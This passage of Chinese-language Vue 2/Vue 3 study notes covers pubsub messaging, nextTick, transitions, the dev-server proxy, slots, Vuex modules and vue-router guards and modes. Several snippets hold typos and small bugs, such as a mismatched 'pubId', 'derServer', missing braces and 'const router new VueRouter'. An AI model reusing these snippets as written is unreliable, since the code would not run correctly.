	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				this.$bus.$emit('hello',this.name)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>
```

### 2.6 消息订阅与发布
适用于组件间通信

#### 步骤
1. 安装pubsub：npm i pubsub-js
2. 引入：import pubsub from 'pubsub-js'
3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身。使用pubsub.subscribe('订阅标志',回调函数)

```vue
methods:{
  demo(data){......}
}
......
mounted() {
  this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
}
```

4. 提供数据：pubsub.publish('订阅标志',数据)
5. 取消订阅：在beforeDestroy钩子中，用PubSub.unsubscribe (pid) 去取消订阅

#### 范例
```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		mounted() {
			// console.log('School',this)
			/* this.$bus.$on('hello',(data)=>{
				console.log('我是School组件，收到了数据',data)
			}) */
			this.pubid = pubsub.subscribe('hello',(msgName,data)=>{
				console.log(this)
				// console.log('有人发布了hello消息，hello消息的回调执行了',msgName,data)
			})
		},
		beforeDestroy() {
			// this.$bus.$off('hello')
			pubsub.unsubscribe(this.pubId)
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				// this.$bus.$emit('hello',this.name)
				pubsub.publish('hello',666)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>
```

### 2.7 nexTick
语法：this.$nextTick(回调函数)

作用：在**下一次** DOM 更新结束后执行其指定的回调。

什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

```vue
this.$nextTick(function(){
	this.$refs.inputTitle.focus()
}
```

### 2.8 Vue封装的过渡与动画
在插入、更新、移除DOM元素时，在合适的时候给元素添加样式类名

1. 操作 css 的 trasition 或 animation
2. vue 会给目标元素添加/移除特定的 class
3. 过渡的相关类名：
    - xxx-enter-active: 指定显示的 transition
    - xxx-leave-active: 指定隐藏的 transition
    - xxx-enter/xxx-leave-to: 指定隐藏时的样式

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1700459553185-efb3fb15-21b7-43a3-8237-87c41ffa3351.png)

具体步骤

1. 用@keyframe 写动画 (css)
2. 准备好样式(使用上述动画)
    1. 元素进入的样式：
    - v-enter：进入的起点
    - v-enter-active：进入过程中
    - v-enter-to：进入的终点
    2. 元素离开的样式：
    - v-leave：离开的起点
    - v-leave-active：离开过程中
    - v-leave-to：离开的终点
3. 使用<transition>包裹要过渡的元素，并配置name属性；若有多个元素需要过度，则需要使用：<transition-group>，且每个元素都要指定key值。
4. 为标签添加v-show

案例

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition appear>//:appear="true"
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}

	.v-enter-active{
		animation: move 0.5s linear;
	}

	.v-leave-active{
		animation: move 0.5s linear reverse;
	}

	@keyframes move {
		from{
			transform: translateX(-100%);
		}
		to{
			transform: translateX(0px);
		}
	}
</style>
```

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group name="hello" appear>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}
	/* 进入的起点、离开的终点 */
	.hello-enter,.hello-leave-to{
		transform: translateX(-100%);
	}
	.hello-enter-active,.hello-leave-active{
		transition: 0.5s linear;
	}
	/* 进入的终点、离开的起点 */
	.hello-enter-to,.hello-leave{
		transform: translateX(0);
	}
</style>
```

### 2.9 脚手架配置代理(与axios有关)
#### axios概述
 步骤：

+ 安装axios：npm i axios
+ 引入axios：inport axios from 'axios'

有关方法

```javascript
axios.get('http://localhost:8080/students').then( //地址是不固定的
	response => {},   //成功的回调函数
  error => {}       //失败的回调函数
) 
```

代理服务器：避免因为端口号不一致导致get或post请求等无法得到实现，在两个端口之间生成一个代理服务器，代理服务器接受A的请求并转发给B，B通过代理服务器响应A的请求

但是并不是转发所有的请求，当请求的资源A本身就有，那么请求便不会被转发

在开启代理服务器后，代理服务器的端口号和本地的端口号一致

代理服务器有两种方式：

+ nginx：学习成本高
+ vue-cli：重头戏

#### devServer.proxy--方式一
在vue.bonfig.js文件中引用前述方法

注意proxy的地址应该是B(5000)，即5000的数据传递给8080

```vue
derServer:{
  proxy:'http://localhost:5000'
  //这一步直接开启代理服务器
  //写目标服务器端口号(被请求资源方)
  //写到端口号即可
}
  //写完记得重启脚手架
```

该方法的缺陷是只能转发一台服务器的请求，而且不能控制请求是否走代理(本地有请求的同名文件，但是并不想打开本地的文件，而是想请求服务器的文件)

#### devServer.proxy--方式二
想走代理就加上/api，不想走就不加

/api也可以改成别的，比如/atguigu，但是此时请求的端口号后面必须跟上/atguigu，'http://localhost:8080/atguigu/students'

如果想要转发多个请求，直接写就可以

```javascript
devServer:{
  proxy:{
    '/api':{
        target:'http://localhost:5000',
        pathRewrite:{'正则表达式':' '},  //必备
        ws:true,  //用于支持websocket
        changeOrigin:true  
      	//控制请求头中的host值--是否说谎
      },
      '/foo':{
        target:'<other_url>'
      }
    }
  }
```

### 2.10 slot插槽
#### 默认插槽
slot插槽要定义在组件中，(挖个坑，等待组件的使用者进行填充)

<slot></slot>

可以写默认值：<slot>默认值</slot>

```vue
<template>
  <div class="category">
    <h3>{{tit1e}}分类</h3>
    <slot>我是默认值</slot>
  </div>
</template>

<script>
  export default
    name:'Category',
    props:['title']
  }
</script>
```

```vue
<Category title="美食">
	<img src="a.jpg" alt="">
</Category>
```

#### 具名插槽
如果想同时给多个内容附上插槽，可以使用v-slot:插槽名，但是需要将多个内容放在一个template标签中，因为v-slot只能使用在template标签上

```vue
<template>
  <div class="category">
    <h3>{{tit1e}}分类</h3>
    <slot name='demo1'>我是demo1</slot>
    <slot name='demo2'>我是demo2</slot>
  </div>
</template>

<script>
  export default
    name:'Category',
    props:['title']
  }
</script>
```

```vue
<Category title="美食">
	<img slot="demo1" src="a.jpg" alt="">
	<a slot="demo2" href:='http:/ww.atguigu.com'>更多美食</a>
  <template v-slot:demo2>
    <a href:="http:/ww.atguigu.com">更多美食</a>
    <a href:="http:/ww.atguigu.com">更多美食</a>
    <a href:="http:/ww.atguigu.com">更多美食</a>
    <a href:="http:/ww.atguigu.com">更多美食</a>
  </template>
</Category>
```

#### 作用域插槽
在使用组件时，数据不在使用者身上，而是在组件里，但是需要使用这些数据，这就导致了作用域问题

在插槽内部绑定上数据，再传递给使用者，使用者在使用插槽时要定义template，并使用scope接受数据(名字自定)，就可以解决作用域问题

```vue
<template>
  <div class="category">
    <h3>{{tit1e}}分类</h3>
    <slot :Game="games" >我是默认值</slot>
  </div>
</template>

<script>
  export default
    name:'Category',
    props:['title'],
    data(){
      return{
      games:['valunlante']
    }
  }
</script>
```

```vue
<template>
  <div class="category">
    <Category>
      <template scope="atguigu">
        <ul>
    			<li v-for = "(g,index) in atguigu.Game" :key="index" > </li>
  			</ul>
      </template>
		</Category>
  </div>
</template>
```

# 3.vuex
## 3.1 概念
在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

使用时机：多个组件依赖于同一状态/来自不同组件的行为需要变更同一状态

原理：

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1701737007619-9dd4fd9a-a470-4b51-8c00-b0244d11d96d.png)

action、mutation、state都是对象，这三个都需要store管理

## 3.2 创建vuex环境
创建文件

```vue

//引入Vue核心库
import Vue from 'vue '
//引入Vuex
import Vuex from 'vuex '
//应用Vuex插件
Vue.use(Vuex)
  
// 准备actions对象——响应组件中用户的动作
const actions = {}
// 准备mutations对象——修改state中的数据
const mutations = {}
//准备state对象——保存具体的数据
const state = {}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state
})
```

在main.js中创建vm时，传入store配置项

```vue

//引入store
import store from './store'

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store
})
```

## 3.3 使用
### 基本使用
在src/store/index.js中，初始化数据、配置actions、配置mutations，操作文件store.js

```vue

//引入Vue核心库
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//引用Vuex
Vue.use(Vuex)

const actions = {
    //响应组件中加的动作
	jia(context,value){
		// console.log('actions中的jia被调用了',miniStore,value)
		context.commit('JIA',value)
	},
}

const mutations = {
    //执行加
	JIA(state,value){
		// console.log('mutations中的JIA被调用了',state,value)
		state.sum += value
	}
}

//初始化数据
const state = {
   sum:0
}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```

组件中读取vuex中的数据：$store.state.sum

组件中修改vuex中的数据：$store.dispatch('action中的方法名',数据)或 $store.commit('mutations中的方法名',数据)

注意：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写dispatch，直接编写commit

### 实例
```vue

//
import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)

const actions = {
	jiaOdd(context,value){
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}

const state = {
	sum:0 //当前的和
}

export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```

```vue
<template>
	<div>
		<h1>当前求和为：{{$store.state.sum}}</h1>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		methods: {
			increment(){
                // commit 操作 mutations
				this.$store.commit('JIA',this.n)
			},
			decrement(){
                // commit 操作 mutations
				this.$store.commit('JIAN',this.n)
			},
			incrementOdd(){
                // dispatch 操作 actions
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
                // dispatch 操作 actions
				this.$store.dispatch('jiaWait',this.n)
			},
		},
		mounted() {
			console.log('Count',this)
		},
	}
</script>

<style lang="css">
	button{
		margin-left: 5px;
	}
</style>
```

## getters
概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

使用：在store.js中追加getters配置

```vue

//
const getters = {
	bigSum(state){
		return state.sum * 10
	}
}

export default new Vuex.Store({
	......
	getters
})
```

组件中读取数据：$store.getters.bigSum

## 3.4 map方法
### 引入
import {mapState, mapGetters, mapActions, mapMutations} from 'vuex'

### mapState
用于帮助我们映射state中的数据为计算属性

```vue
computed: {
    //借助mapState生成计算属性：sum、school、subject（对象写法）
     ...mapState({sum:'sum',school:'school',subject:'subject'}),
         
    //借助mapState生成计算属性：sum、school、subject（数组写法）
    ...mapState(['sum','school','subject']),
},
```

### mapGetters
用于帮助我们映射getters中的数据为计算属性

```vue
computed: {
    //借助mapGetters生成计算属性：bigSum（对象写法）
    ...mapGetters({bigSum:'bigSum'}),

    //借助mapGetters生成计算属性：bigSum（数组写法）
    ...mapGetters(['bigSum'])
},
```

### mapActions
用于帮助我们生成与actions对话的方法

即：包含$store.dispatch(xxx)的函数

```vue
methods:{
    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
    ...mapActions(['jiaOdd','jiaWait'])
}
```

### mapMutations
用于帮助我们生成与mutations对话的方法

即：包含$store.commit(xxx)的函数

```vue
methods:{
    //靠mapActions生成：increment、decrement（对象形式）
    ...mapMutations({increment:'JIA',decrement:'JIAN'}),
    
    //靠mapMutations生成：JIA、JIAN（对象形式）
    ...mapMutations(['JIA','JIAN']),
}
```

注意：mapActions与mapMutations使用时，若需要传递参数：在模板中绑定事件时就传递好参数，否则传的参数是事件对象(event)。

### 实例
```vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1>
    <h3>当前求和放大10倍为：{{ bigSum }}</h3>
    <h3>年龄：{{ age }}</h3>
    <h3>姓名：{{name}}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
	<!-- 用了mapActions 和 mapMutations 的话要主动传参 -->
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapActions, mapMutations } from 'vuex'

export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
    };
  },
  computed: {
		...mapState(['sum', 'age', 'name']),
		...mapGetters(['bigSum'])  
  },
  methods: {
    ...mapActions({incrementOdd: 'sumOdd', incrementWait: 'sumWait'}),
    ...mapMutations({increment: 'sum', decrement: 'reduce'})
  },
  mounted() {
    console.log("Count", this);
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

## 3.5 vuex模块化编码
### 方法
让代码更好维护，让多种数据分类更加明确。

分成不同的功能模块，每个功能模块内部有自己的state、mutations、actions、getters等，再将所有的模块汇集到store的modules中

命名空间namespaced打开后，才可以背modules识别

```vue

//
const countAbout = {
  namespaced:true,//开启命名空间
  state:{x:1},
  mutations: { ... },
  actions: { ... },
  getters: {
    bigSum(state){
       return state.sum * 10
    }
  }
}

const personAbout = {
  namespaced:true,//开启命名空间
  state:{ ... },
  mutations: { ... },
  actions: { ... }
}

const store = new Vuex.Store({
  modules: {
    countAbout,
    personAbout
  }
})
```

开启命名空间后，组件中读取state数据：

```vue

//方式一：自己直接读取
this.$store.state.personAbout.list
//方式二：借助mapState读取：
//用 mapState 取 countAbout 中的state 必须加上 'countAbout'
...mapState('countAbout',['sum','school','subject']),
```

开启命名空间后，组件中读取getters数据：'模块名/方法名'

```vue

//方式一：自己直接读取
this.$store.getters['personAbout/firstPersonName']
//方式二：借助mapGetters读取：
...mapGetters('countAbout',['bigSum'])
```

开启命名空间后，组件中调用dispatch：

```vue

//方式一：自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二：借助mapActions：
...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
```

开启命名空间后，组件中调用commit：不同模块之间用/隔开

```vue

//方式一：自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二：借助mapMutations：
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
```

### 案例
```vue

//求和相关的配置
export default {
	namespaced:true,
	actions:{
		jiaOdd(context,value){
			console.log('actions中的jiaOdd被调用了')
			if(context.state.sum % 2){
				context.commit('JIA',value)
			}
		},
		jiaWait(context,value){
			console.log('actions中的jiaWait被调用了')
			setTimeout(()=>{
				context.commit('JIA',value)
			},500)
		}
	},
	mutations:{
		JIA(state,value){
			console.log('mutations中的JIA被调用了')
			state.sum += value
		},
		JIAN(state,value){
			console.log('mutations中的JIAN被调用了')
			state.sum -= value
		},
	},
	state:{
		sum:0, //当前的和
		school:'尚硅谷',
		subject:'前端',
	},
	getters:{
		bigSum(state){
			return state.sum*10
		}
	},
}
```

```vue

//人员管理相关的配置
import axios from 'axios'
import { nanoid } from 'nanoid'
export default {
	namespaced:true,
	actions:{
		addPersonWang(context,value){
			if(value.name.indexOf('王') === 0){
				context.commit('ADD_PERSON',value)
			}else{
				alert('添加的人必须姓王！')
			}
		},
		addPersonServer(context){
			axios.get('https://api.uixsj.cn/hitokoto/get?type=social').then(
				response => {
					context.commit('ADD_PERSON',{id:nanoid(),name:response.data})
				},
				error => {
					alert(error.message)
				}
			)
		}
	},
	mutations:{
		ADD_PERSON(state,value){
			console.log('mutations中的ADD_PERSON被调用了')
			state.personList.unshift(value)
		}
	},
	state:{
		personList:[
			{id:'001',name:'张三'}
		]
	},
	getters:{
		firstPersonName(state){
			return state.personList[0].name
		}
	},
}
```

```vue

//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
import countOptions from './count'
import personOptions from './person'
//应用Vuex插件
Vue.use(Vuex)

//创建并暴露store
export default new Vuex.Store({
	modules:{
		countAbout:countOptions,
		personAbout:personOptions
	}
})
```

```vue
<template>
	<div>
		<h1>当前求和为：{{sum}}</h1>
		<h3>当前求和放大10倍为：{{bigSum}}</h3>
		<h3>我在{{school}}，学习{{subject}}</h3>
		<h3 style="color:red">Person组件的总人数是：{{personList.length}}</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
		<button @click="incrementWait(n)">等一等再加</button>
	</div>
</template>

<script>
	import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		computed:{
			//借助mapState生成计算属性，从state中读取数据。（数组写法）
			...mapState('countAbout',['sum','school','subject']),
			...mapState('personAbout',['personList']),
			//借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
			...mapGetters('countAbout',['bigSum'])
		},
		methods: {
			//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
			...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
			//借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
			...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
		},
		mounted() {
			console.log(this.$store)
		},
	}
</script>

<style lang="css">
	button{
		margin-left: 5px;
	}
</style>
```

```vue
<template>
	<div>
		<h1>人员列表</h1>
		<h3 style="color:red">Count组件求和为：{{sum}}</h3>
		<h3>列表中第一个人的名字是：{{firstPersonName}}</h3>
		<input type="text" placeholder="请输入名字" v-model="name">
		<button @click="add">添加</button>
		<button @click="addWang">添加一个姓王的人</button>
		<button @click="addPersonServer">添加一个人，名字随机</button>
		<ul>
			<li v-for="p in personList" :key="p.id">{{p.name}}</li>
		</ul>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'
	export default {
		name:'Person',
		data() {
			return {
				name:''
			}
		},
		computed:{
			personList(){
				return this.$store.state.personAbout.personList
			},
			sum(){
				return this.$store.state.countAbout.sum
			},
			firstPersonName(){
				return this.$store.getters['personAbout/firstPersonName']
			}
		},
		methods: {
			add(){
				const personObj = {id:nanoid(),name:this.name}
				this.$store.commit('personAbout/ADD_PERSON',personObj)
				this.name = ''
			},
			addWang(){
				const personObj = {id:nanoid(),name:this.name}
				this.$store.dispatch('personAbout/addPersonWang',personObj)
				this.name = ''
			},
			addPersonServer(){
				this.$store.dispatch('personAbout/addPersonServer')
			}
		},
	}
</script>
```

# 4.路由
## 4.1 概念
![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1701841555838-8c3b27f2-90d0-424e-a4f7-c76426ed5d90.png)

一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。key为路径，value为function/component

路由分为两种

+ 后端路由：value是function，用于处理客户端请求的条件；
    - 服务器收到一个请求时，根据请求路径找到匹配的函数来处理请求，并返回响应数据
+ 前端路由：value是component，用于展示页面
    - 当浏览器的路径改变时，对应的组件就会显示



单页Web应用(SPA)

+ 整个应用只有一个完整的页面
+ 点击页面中的导航链接不会刷新页面，只会做页面的局部更新
+ 数据需要Ajax请求
+ vue-router就是专门用来实现SPA应用的

## 4.2 基本使用
1. 安装vue-router：npm i vue-router
2. 使用应用插件：Vue.use(VueRouter)
3. 编写router配置项：path，component
4. 实现路由切换：<router-link to="/xxx"></router-link>
5. 指定展示区域：<router-view></router-view>

```vue

//引入VueRouter
import VueRouter from 'vue-router'
//引入Luyou 组件
import About from '../components/About.vue'
import Home from '../components/Home.vue'

//创建router实例对象，去管理一组一组的路由规则
const router = new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home
		}
	]
})
  
//暴露router
export default router
```

```vue
<router-link to="/home">Home</router-link>
<router-link active-class="active" to="/about">About</router-link>
//active-class可配置高亮样式
```

```vue
<router-view></router-view>
```

## 4.3 注意点
+ 路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹。
+ 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
+ 每个组件都有自己的$route属性，里面存储着自己的路由信息。
+ 整个应用只有一个router，可以通过组件的$router属性获取到。

## 4.4 多级路由(嵌套路由)
配置路由规则，使用children配置项，path不需要加/

```vue
routes:[
	{
		path:'/about',
		component:About,
	},
	{
		path:'/home',
		component:Home,
		children:[ //通过children配置子级路由
			{
				path:'news', //此处一定不要写：/news
				component:News
			},
			{
				path:'message',//此处一定不要写：/message
				component:Message
			}
		]
	}
]
```

```vue
<router-link to="/home/news">News</router-link>
```

```vue
<router-view></router-view>
```

## 4.5 路由的query参数
两种写法：字符串写法和对象写法

```vue
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="`/home/message/detail?id=${m.id} & title=${m.title}`">跳转</router-link>

<!-- 跳转并携带query参数，to的对象写法 -->
<router-link 
	:to = "{
		path:'/home/message/detail',
		query:{
		   id:666,
       title:'你好 '
		}
	}">跳转</router-link>
```

```vue
//
$route.query.id
$route.query.title
```

## 4.6 命名路由
可以简化路由的跳转

```vue

//
{
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
          name:'hello', //给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}
```

```vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		   id:666,
       title:'你好'
		}
	}">跳转</router-link>
```

## 4.7 路由的params参数
路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置

```vue

//
{
	path:'/home',
	component:Home,
	children:[
		{
			path:'news',
			component:News
		},
		{
			component:Message,
			children:[
				{
					name:'xiangqing',
					path:'detail/:id/:title', //使用占位符声明接收params参数
					component:Detail
				}
			]
		}
	]
}
```

```vue
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
				
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		   id:666,
       title:'你好'
		}
	}">跳转</router-link>
```

```vue
//
$route.params.id
$route.params.title
```

## 4.8 路由的props配置
让路由组件更方便的收到参数

```vue

{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props($route) {
		return {
		  id: $route.query.id,
		  title:$route.query.title,
		  a: 1,
		  b: 'hello'
		}
	}
}
```

```vue
<template>
  <ul>
      <h1>Detail</h1>
      <li>消息编号：{{id}}</li>
      <li>消息标题：{{title}}</li>
      <li>a:{{a}}</li>
      <li>b:{{b}}</li>
  </ul>
</template>

<script>
export default {
    name: 'Detail',
    props: ['id', 'title', 'a', 'b'],
    mounted () {
        console.log(this.$route);
    }
}
</script>
```

## 4.9 <router-link>的replace属性
+ 作用：控制路由跳转时操作浏览器历史记录的模式
+ 浏览器的历史记录有两种写入方式：分别为push和replace，push是追加历史记录，replace是替换当前记录。路由跳转时候默认为push
+ 如何开启replace模式：
    - <router-link replace.......>News</router-link>

## 4.11 编程式路由导航
不借助<router-link> 实现路由跳转，让路由跳转更加灵活

```vue

//$router的两个API
this.$router.push({
	name:'xiangqing',
	params:{
			id:xxx,
			title:xxx
	}
})

this.$router.replace({
	name:'xiangqing',
	params:{
			id:xxx,
			title:xxx
	}
})
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go(n) //可前进也可后退,n>0：前进n步，n<0：后退n步
```

## 4.12 缓存路由组件
让不展示的路由组件保持挂载，不被销毁

```vue

<keep-alive include="News"> //include指是组件名
    <router-view></router-view>
</keep-alive>
```

## 4.13 两个新的生命周期钩子
路由组件所独有的两个钩子，用于捕获路由组件的激活状态。

具体名字：

+ activated：路由组件被激活时触发。
+ deactivated：路由组件失活时触发。

这两个生命周期钩子需要配合前面的缓存路由组件使用（没有缓存路由组件不起效果）

需要写在vue内，和data、methods并列

## 4.14 路由守卫
作用：对路由进行权限控制

分类：全局守卫、独享守卫、组件内守卫

### 全局守卫
写在定义路由的文件内部

前提需要再路由内部加上守卫标识符号，用来判断是否需要守卫

```vue

//
const router new VueRouter({
	routes:[
    {
			name:'guanyu',
			path:'/about',
			component:About,
			meta:{isAuth:false}
    }
  ]
})
```

```vue

//全局前置守卫：初始化时执行/每次路由切换前执行
router.beforeEach((to,from,next)=>{
	console.log('beforeEach',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'zhejiang'){ //权限控制的具体规则
			next() //放行
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next() //放行
	}
})

//全局后置守卫：初始化时执行/每次路由切换后执行
router.afterEach((to,from)=>{
	console.log('afterEach',to,from)
	if(to.meta.title){ 
		document.title = to.meta.title //修改网页的title
	}else{
		document.title = 'vue_test'
	}
})
```

### 独享守卫
就是在routes子路由内写守卫

```vue
beforeEnter(to,from,next){
	console.log('beforeEnter',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){
			next()
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next()
	}
}
```

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1701850045839-c4be39aa-d01f-46a4-a5e2-e34634bd1bbf.png)

### 组件内守卫
在具体组件内部写守卫

```vue

//进入守卫：通过路由规则，进入该组件时被调用
beforeRouteEnter (to, from, next) {
},
//离开守卫：通过路由规则，离开该组件时被调用
beforeRouteLeave (to, from, next) {
}
```

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1701850181986-54edf35b-ff67-4f44-9d0c-4b3ee43fe72b.png)

## 4.15 路由器的两种工作模式
1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即hash值不会发给服务器。
3. hash模式：
+ 地址中永远带着#号，不美观 。
+ 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
+ 兼容性较好。
4. history模式：
+ 地址干净，美观 。
+ 兼容性和hash模式相比略差。
+ 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1701847150010-ccf485db-89a9-428b-b8ef-25b4d51669b7.png)

# 5.vue3
## 5.1 创建
使用create-vue创建项目

1. 前提条件：node版本高于16.0
2. 创建一个vue3：npm init vue@latest
    1. 注意倒数第二个要求选yes
3. 安装依赖：npm install
4. 运行：npm run dev

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1701931945544-78330beb-a3bb-4244-8fa5-d1168e1af289.png)

## 5.2 项目目录和关键文字
![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1701932393858-b10c7471-e68b-4506-82b1-87ca42ed9671.png)

+ vite.config.js -项目的配置文件-基于vite的配置
+ package.json -项目包文件核心-依赖项变成了 Vue3.x 和 vite
+ main.js -入口文件-createApp函数创建应用实例
+ app.vue -根组件-SFC单文件组件 script - template - style
    - 变化一：脚本script和模板template顺序调整
    - 变化二：模板template不再要求唯一根元素
    - 变化三：脚本script添加setup标识支持组合式API
+ index.html -单页入口-提供id为app的挂载点

## 5.3选项式API
### setup
1. 理解：vue3.0中一个新的配置项，值为一个函数。
2. setup是所有Composition API(组合API)“表演的舞台”
3. 组件中所用到的：data、methods、computed、watch等，均要配置在setup中。
4. setup函数的两种返回值：
    - 若返回一个对象，则对象中的属性、方法，在模板中均可以直接使用。（重点关注！）
